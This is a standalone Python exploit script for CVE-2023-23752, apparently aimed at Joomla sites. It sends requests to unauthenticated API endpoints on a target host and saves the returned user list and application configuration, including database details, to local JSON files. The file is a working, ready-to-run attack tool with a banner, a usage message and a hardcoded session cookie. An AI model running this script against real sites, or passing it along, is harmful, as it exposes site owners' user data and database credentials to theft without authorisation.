import requests
import sys
import socket
from termcolor import colored

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Cookie': '3815f63d17a9109b26eb1b8c114159ac=4e4pu2h9qragk2qs57c894kdj7'
}

banner = """
 __  __ ____     ____  _____ ___   ____  ____  _____ _____ ___  _______     __
|  \/  |  _ \   |  _ \| ____|_ _| |  _ \|  _ \| ____|  ___/ _ \| ____\ \   / /
| |\/| | | | |  | |_) |  _|  | |  | |_) | |_) |  _| | |_ | | | |  _|  \ \ / / 
| |  | | |_| |  |  _ <| |___ | |  |  __/|  _ <| |___|  _|| |_| | |___  \ V /  
|_|  |_|____/   |_| \_\_____|___| |_|   |_| \_\_____|_|   \___/|_____|  \_/   

        CVE-2023-23752
        Script written by Mr. Robot.txt
    """
print(colored(banner, 'cyan'))

if len(sys.argv) < 2:
    print('[-]Usage: python CVE-2023-23752.py <hostname> or <ip address>')
    sys.exit()


try:
    address = sys.argv[1]
    ip_address = socket.gethostbyname(address)
    if 'http' in address:
        baseurl = address
    else:
        baseurl = 'http://' + address

    print(f'[-]Target set => {baseurl}')

    usersinfo_url = baseurl + '/api/index.php/v1/users?public=true'
    dbinfo_url = baseurl + '/api/index.php/v1/config/application?public=true'

    userinfo_response = requests.get(usersinfo_url, headers=headers)
    dbinfo_response = requests.get(dbinfo_url, headers=headers)

    if userinfo_response.status_code == 200:
        with open('userinfo.json', 'w', encoding='utf-8-sig') as uf:
            uf.write(userinfo_response.text)
            print('[*]Successfully created userinfo.json file in current directory')
    
    if dbinfo_response.status_code == 200:
        with open('dbinfo.json', 'w', encoding='utf-8-sig') as df:
            df.write(dbinfo_response.text)
            print('[*]Successfully created dbinfo.json file in current directory')

except requests.exceptions.ConnectionError as e:
    print(f"[!]ConnectionError: {e}")
    sys.exit()

except requests.exceptions.Timeout as e:
    print(f"[!]Timeout: {e}")
    sys.exit()

except requests.exceptions.HTTPError as e:
    print(f"[!]HTTPError: {e}")
    sys.exit()

except requests.exceptions.TooManyRedirects as e:
    print(f"[!]TooManyRedirects: {e}")
    sys.exit()

except requests.exceptions.RequestException as e:
    print(f"[!]RequestException: {e}")
    sys.exit()

except socket.gaierror as e:
    print(f"[!]Couldn't resolve hostname")
    sys.exit()

except KeyboardInterrupt:
    print("[!]Exiting the script!")
    sys.exit()